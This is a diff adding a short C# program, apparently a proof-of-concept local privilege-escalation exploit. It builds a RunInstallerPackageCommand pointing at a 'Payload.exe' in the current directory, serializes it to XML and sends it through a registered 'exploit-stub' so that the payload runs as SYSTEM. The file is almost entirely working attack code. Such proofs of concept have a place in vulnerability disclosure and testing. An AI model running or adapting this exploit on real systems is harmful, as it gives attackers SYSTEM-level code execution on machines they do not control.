@@ -1,0 +1,44 @@
+﻿using System;
+using System.IO;
+using System.Xml;
+using System.Xml.Serialization;
+using System.Security;
+using SBAMessages;
+
+namespace CipollaClient {
+
+    [SecuritySafeCritical]
+    public class CipollaClient {
+
+        public static void Main() {
+
+            //create a new RunInstallerPackageCommand object which has it's InstallerPackagePath set
+            //to the location of the program to be executed as SYSTEM
+            RunInstallerPackageCommand CmdXML = new RunInstallerPackageCommand();
+            CmdXML.InstallerPackagePath = Path.Combine(Directory.GetCurrentDirectory(), "Payload.exe");
+
+            //serialize this object into a string of XML
+            //https://stackoverflow.com/questions/4123590/serialize-an-object-to-xml
+            XmlSerializer xsSubmit = new XmlSerializer(typeof(RunInstallerPackageCommand));
+            var subReq = CmdXML;
+            var xml = "";
+            using (var sww = new StringWriter()) {
+                using (XmlWriter writer = XmlWriter.Create(sww)) {
+                    xsSubmit.Serialize(writer, subReq);
+                    xml = sww.ToString();
+                }
+            }
+            
+            //create a new SBA stub object
+            SBAStub.SBAStub stub = new SBAStub.SBAStub();
+
+            //register the stub
+            stub.RegisterSBAStub("exploit-stub");
+
+            //send the serialized RunInstallerPackageCommand
+            stub.SendCommand(xml);
+
+            return;
+        }
+    }
+}
